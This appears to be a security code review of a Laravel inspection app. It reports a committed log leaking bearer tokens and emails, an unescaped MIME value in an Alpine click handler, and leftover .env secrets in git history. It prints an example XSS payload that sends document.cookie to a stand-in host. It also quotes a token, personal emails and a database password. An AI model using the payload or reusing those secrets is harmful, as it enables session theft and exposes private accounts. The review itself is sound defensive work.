## Findings

- 🟥 Critical — `storage/logs/laravel.log` (tracked file, whole history) + `.gitignore:3` —
  a real Laravel log file is committed to git and is **still being modified inside this diff**
  (41 new lines added 2026-08-24 06:21–06:24, part of `origin/main...HEAD`). It contains 28
  occurrences of `"token":"<id>|<48-char-secret>"` — live-shaped Sanctum bearer tokens from real
  login attempts, e.g. `"token":"278|BBhH1ZIhQtMCRgINVcJ0AVIH8YkgvrII1fHjQirU97b88815"` for
  user id 3 (`dones@gmail.com`) — plus a tester's real personal email
  (`francis22dones@gmail.com`) on a failed-login line, session ids, and full VIQ exam answer
  payloads (`answers`, `remarks`) dumped via a debug `API Response:` log line. This round's
  hardening commit (a486ed1, "N4 hardening") added a `.gitignore` intended to stop exactly this
  (`.env`, `storage/*.log`), but the pattern is wrong: `storage/*.log` only matches files
  directly inside `storage/`, not the nested `storage/logs/laravel.log`. Confirmed empirically:
  ```
  $ git ls-files | grep -i storage/logs
  storage/logs/laravel.log
  $ git check-ignore -v storage/logs/laravel.log
  (no output, exit 1 — NOT ignored)
  ```
  Effect: every future request keeps appending to a file that is still tracked and will keep
  landing in commits/PRs, and the tokens/PII already committed remain retrievable from git
  history (`git log -p`, or on GitHub if this remote is pushed) regardless of any future fix to
  HEAD. This is a live secret leak into version control, not a hypothetical one — 28 real-shaped
  tokens are present right now.
  Fix direction: `git rm --cached storage/logs/laravel.log` (keep it on disk, stop tracking),
  correct the gitignore pattern to `storage/logs/*.log` (or `storage/logs/`), and treat every
  token in the log as compromised — rotate/invalidate them via swan-api (they're real
  Sanctum-style tokens tied to real accounts). A git-history scrub is a separate, larger
  decision for the user, but should at least be raised. (confidence: high)

- 🟥 Critical — `resources/views/images/index.blade.php:172` and `:261` — the `modalMime`
  value is interpolated into an inline Alpine `@click` JS-string attribute with only Blade's
  default HTML-escaping, while every sibling value in the *same* attribute
  (`modalName`, `modalVessel`, `modalInspectionId`, `modalInspectionDate`, `modalInspectionLoc`,
  `modalInspector`, `modalRemarks`) is wrapped in `addslashes(...)` first:
  ```blade
  modalMime='{{ $img['image_mime_type'] ?? 'image/jpeg' }}';
  modalVessel='{{ addslashes($vesselName) }}';
  ```
  `htmlspecialchars` (Blade's `{{ }}`) alone does not protect a value embedded in an inline JS
  event-handler attribute: the browser HTML-decodes the attribute (turning `&#039;` back into
  `'`) *before* handing the string to the JS engine, so a `'` survives into the JS source and
  terminates the string early — `addslashes()` is what actually prevents that break-out (it's
  correctly used on every other field here, confirming the pattern is understood, just missed
  on this one). If `image_mime_type` on an `inspection_images` row can ever contain attacker
  data (it flows through the same mobile-upload pipeline as `remarks`/`inspector_name`, which
  the task brief already flags as mobile/API-controlled; not itself confirmed in the API repo,
  which is out of this review's scope), a value like `image/jpeg'; fetch('//evil/'+document.cookie);//`
  breaks out of the JS string and executes in the shore reviewer's authenticated session —
  a page every admin/shore user visits routinely. Even absent confirmed exploitability, this is
  a real, demonstrable escaping defect on a field one visual scan away from its correctly-escaped
  siblings.
  Fix direction: wrap both occurrences the same way as the other fields:
  `modalMime='{{ addslashes($img['image_mime_type'] ?? 'image/jpeg') }}';`
  (confidence: high on the code defect; medium on live exploitability since `image_mime_type`'s
  upstream provenance wasn't verified against the out-of-scope API repo — capped Critical
  regardless per rubric, "unsafe HTML"/injection is a no-judgment-call category)

- 🟧 Warning — `.env` (deleted in this diff) — the file removed from tracking in commit a486ed1
  previously contained a real `APP_KEY` and `DB_PASSWORD=swan` (verified via
  `git diff 0919402675..HEAD -- .env`, which shows the deletion diff with the plaintext values).
  Removing it from HEAD is the right move and `.env.example` now ships safe placeholders
  (`DB_PASSWORD=changeme`, `APP_DEBUG=false`), but the real key/password remain permanently
  retrievable from git history via `git show <pre-a486ed1-sha>:.env`. Recommend rotating
  `APP_KEY` (this invalidates existing encrypted cookies/sessions — coordinate) and the DB
  password, and flagging to the user whether this repo has ever been pushed to a public remote.
  (confidence: high; not blocking this review since it's a remediation-in-progress, not a
  regression introduced by this diff)

- 🟨 Improvement — `bootstrap/cache/{packages.php,services.php}`,
  `storage/framework/views/*.php` (9 files) — compiled Laravel artifacts from a local
  `view:cache`/provider-discovery run are committed to git as part of this diff. Checked their
  contents for embedded secrets (none — these are provider manifests and compiled Blade, not
  `config:cache`, so no `.env` values leaked into them), but committing build output is
  generally unwanted: it silently goes stale, bloats the repo, and one of these categories
  (`config:cache`) would leak `.env` values if anyone ever runs it and commits the result the
  same way. Recommend adding `bootstrap/cache/*.php` (already partially gitignored by Laravel's
  own nested `bootstrap/cache/.gitignore`, but these three files were tracked before that
  existed) and `storage/framework/views/*.php` to the top-level `.gitignore` and untracking them.
  (confidence: high)
